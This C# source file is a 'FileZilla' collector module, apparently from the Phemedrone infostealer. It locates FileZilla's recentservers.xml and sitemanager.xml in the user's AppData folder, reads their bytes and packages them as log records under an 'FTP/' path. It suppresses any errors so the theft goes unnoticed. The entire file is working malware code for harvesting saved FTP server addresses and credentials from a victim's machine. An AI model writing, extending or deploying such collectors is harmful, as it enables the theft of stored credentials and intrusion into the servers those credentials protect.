using System;
using System.Collections.Generic;
using System.IO;
using Phemedrone.Classes;
using Phemedrone.Extensions;

namespace Phemedrone.Services
{
    public class FileZilla : IService
    {
        public override PriorityLevel Priority => PriorityLevel.Medium;

        protected override LogRecord[] Collect()
        {
            var array = new List<LogRecord>();
            try
            {
                AddFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentservers.xml");
                AddFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\sitemanager.xml");
            }
            catch
            {
                // ignored
            }
            void AddFile(string fullPath)
            {
                var content = NullableValue.Call(() => File.ReadAllBytes(fullPath));
                if (content == null) return;
                var path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla";
                array.Add(new LogRecord
                {
                    Path = "FTP/" + fullPath.Replace(path + "\\", null),
                    Content = content
                });
            }
            return array.ToArray();
        }
        
    }
}